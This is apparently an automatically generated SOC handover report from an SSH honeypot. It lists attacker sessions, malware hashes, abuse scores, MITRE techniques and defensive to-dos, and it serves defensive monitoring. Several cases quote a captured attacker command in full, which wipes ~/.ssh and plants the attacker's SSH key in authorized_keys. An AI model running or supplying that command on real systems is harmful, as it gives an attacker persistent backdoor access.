| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 20:09:16` | `cowrie.session.connect` |
| `2026-04-04 20:09:16` | `cowrie.client.version` |
| `2026-04-04 20:09:16` | `cowrie.client.kex` |
| `2026-04-04 20:09:16` | `cowrie.login.success` |
| `2026-04-04 20:09:17` | `cowrie.session.params` |
| `2026-04-04 20:09:17` | `cowrie.command.input` |
| `2026-04-04 20:09:17` | `cowrie.command.failed` |
| `2026-04-04 20:09:17` | `cowrie.log.closed` |
| `2026-04-04 20:09:17` | `cowrie.session.params` |
| `2026-04-04 20:09:17` | `cowrie.command.input` |
| `2026-04-04 20:09:17` | `cowrie.session.file_download` |
| `2026-04-04 20:09:17` | `cowrie.log.closed` |
| `2026-04-04 20:09:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.106[.]145` to AbuseIPDB if not already reported
- [ ] Block `101.36.106[.]145` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-e53ba80580ab

| Field | Detail |
|---|---|
| **Source IP** | `101.36.106[.]145` |
| **First Seen** | 2026-04-04 20:09 |
| **Last Seen** | 2026-04-04 20:09 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 20:09:19` | `cowrie.session.connect` |
| `2026-04-04 20:09:19` | `cowrie.client.version` |
| `2026-04-04 20:09:19` | `cowrie.client.kex` |
| `2026-04-04 20:09:19` | `cowrie.login.success` |
| `2026-04-04 20:09:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.106[.]145` to AbuseIPDB if not already reported
- [ ] Block `101.36.106[.]145` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f52320d82c5c

| Field | Detail |
|---|---|
| **Source IP** | `101.36.106[.]145` |
| **First Seen** | 2026-04-04 20:15 |
| **Last Seen** | 2026-04-04 20:16 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 20:15:57` | `cowrie.session.connect` |
| `2026-04-04 20:15:57` | `cowrie.client.version` |
| `2026-04-04 20:15:57` | `cowrie.client.kex` |
| `2026-04-04 20:15:57` | `cowrie.login.success` |
| `2026-04-04 20:15:58` | `cowrie.session.params` |
| `2026-04-04 20:15:58` | `cowrie.command.input` |
| `2026-04-04 20:15:58` | `cowrie.command.failed` |
| `2026-04-04 20:15:58` | `cowrie.log.closed` |
| `2026-04-04 20:15:58` | `cowrie.session.params` |
| `2026-04-04 20:15:58` | `cowrie.command.input` |
| `2026-04-04 20:15:58` | `cowrie.session.file_download` |
| `2026-04-04 20:15:58` | `cowrie.log.closed` |
| `2026-04-04 20:16:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.106[.]145` to AbuseIPDB if not already reported
- [ ] Block `101.36.106[.]145` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-594938587e89

| Field | Detail |
|---|---|
| **Source IP** | `101.36.106[.]145` |
| **First Seen** | 2026-04-04 20:16 |
| **Last Seen** | 2026-04-04 20:16 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 20:16:00` | `cowrie.session.connect` |
| `2026-04-04 20:16:00` | `cowrie.client.version` |
| `2026-04-04 20:16:00` | `cowrie.client.kex` |
| `2026-04-04 20:16:00` | `cowrie.login.success` |
| `2026-04-04 20:16:01` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.106[.]145` to AbuseIPDB if not already reported
- [ ] Block `101.36.106[.]145` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bfa0105d0b39

| Field | Detail |
|---|---|
| **Source IP** | `101.36.106[.]145` |
| **First Seen** | 2026-04-04 20:18 |
| **Last Seen** | 2026-04-04 20:18 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 20:18:16` | `cowrie.session.connect` |
| `2026-04-04 20:18:16` | `cowrie.client.version` |
| `2026-04-04 20:18:16` | `cowrie.client.kex` |
| `2026-04-04 20:18:16` | `cowrie.login.success` |
| `2026-04-04 20:18:16` | `cowrie.session.params` |
| `2026-04-04 20:18:16` | `cowrie.command.input` |
| `2026-04-04 20:18:16` | `cowrie.command.failed` |
| `2026-04-04 20:18:16` | `cowrie.log.closed` |
| `2026-04-04 20:18:17` | `cowrie.session.params` |
| `2026-04-04 20:18:17` | `cowrie.command.input` |
| `2026-04-04 20:18:17` | `cowrie.session.file_download` |
| `2026-04-04 20:18:17` | `cowrie.log.closed` |
| `2026-04-04 20:18:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.106[.]145` to AbuseIPDB if not already reported
- [ ] Block `101.36.106[.]145` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-72941f9f5bf8

| Field | Detail |
|---|---|
| **Source IP** | `101.36.106[.]145` |
| **First Seen** | 2026-04-04 20:18 |
| **Last Seen** | 2026-04-04 20:18 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-04 20:18:19` | `cowrie.session.connect` |
| `2026-04-04 20:18:19` | `cowrie.client.version` |
| `2026-04-04 20:18:19` | `cowrie.client.kex` |
| `2026-04-04 20:18:19` | `cowrie.login.success` |
| `2026-04-04 20:18:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `101.36.106[.]145` to AbuseIPDB if not already reported
- [ ] Block `101.36.106[.]145` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `101.36.106[.]145` | **25** | 2026-04-04 19:22 | 2026-04-04 20:20 | 0m | 25 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `154.198.215[.]50` | **6** | 2026-04-04 20:13 | 2026-04-04 20:27 | 0m | 6 | `T1110.001 · T1592` | 🟢 LOW |
| `103.118.150[.]139` | 1 | 2026-04-04 20:12 | 2026-04-04 20:12 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `103.156.237[.]37` | 1 | 2026-04-04 20:08 | 2026-04-04 20:08 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `113.11.34[.]221` | 1 | 2026-04-04 19:29 | 2026-04-04 19:29 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `114.200.210[.]83` | 1 | 2026-04-04 19:33 | 2026-04-04 19:33 | 12s | 0 | `T1592` | 🟢 LOW |
| `116.90.225[.]130` | 1 | 2026-04-04 18:42 | 2026-04-04 18:42 | 13s | 0 | `T1592` | 🟢 LOW |
| `122.252.112[.]58` | 1 | 2026-04-04 19:32 | 2026-04-04 19:32 | 12s | 0 | `T1592` | 🟢 LOW |
| `125.35.109[.]214` | 1 | 2026-04-04 19:10 | 2026-04-04 19:10 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `128.185.220[.]90` | 1 | 2026-04-04 18:55 | 2026-04-04 18:56 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `178.183.125[.]51` | 1 | 2026-04-04 19:34 | 2026-04-04 19:34 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `182.75.119[.]58` | 1 | 2026-04-04 20:27 | 2026-04-04 20:27 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `220.246.42[.]212` | 1 | 2026-04-04 19:49 | 2026-04-04 19:49 | 4s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `49.124.153[.]60` | 1 | 2026-04-04 19:33 | 2026-04-04 19:33 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `51.83.68[.]69` | 1 | 2026-04-04 19:53 | 2026-04-04 19:53 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `58.57.154[.]146` | 1 | 2026-04-04 20:12 | 2026-04-04 20:12 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |
| `74.218.95[.]154` | 1 | 2026-04-04 19:14 | 2026-04-04 19:14 | 3s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (21 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 41/100 | 🟡 MEDIUM | **29/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **37/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/75** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **47/75** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `49.124.153[.]60` | MY | DiGi Telecommunications Sdn Bhd | **100** ⚠️ | 15 |
| `178.183.125[.]51` | PL | blueconnect | **100** ⚠️ | 28 |
| `114.200.210[.]83` | KR | SK Broadband Co Ltd | **100** ⚠️ | 6 |
| `116.90.225[.]130` | NP | Websurfer Nepal Communication System Pvt. Ltd | **100** ⚠️ | 15 |
| `58.57.154[.]146` | CN | CHINANET SHANDONG PROVINCE NETWORK | **100** ⚠️ | 44 |
| `125.35.109[.]214` | CN | China Unicom Beijing province network | **100** ⚠️ | 50 |
| `122.252.112[.]58` | KR | HVAra | **100** ⚠️ | 11 |
| `101.36.106[.]145` | HK | UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED | **100** ⚠️ | 1 |
| `220.246.42[.]212` | HK | Hong Kong Telecommunications (HKT) Limited Mass Internet | **100** ⚠️ | 50 |
| `128.185.220[.]90` | IN | BHARTI-AIRTEL | **100** ⚠️ | 30 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 63 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 43 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 20 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 9 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 9 |

---

## 🔕 False Positive Summary (4 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 3 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 70 cases |
| Tool 34  | Credential Extractor        | ✅ 63 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 2 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 23 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 4 filtered (5.7%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 20 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 21 files |
| Tool 33  | YARA Classifier             | ✅ 7 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 20 priority case(s) shown individually · 17 recon entry/entries in table (2 group(s) consolidating 31 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-04-04T20:28:59Z_
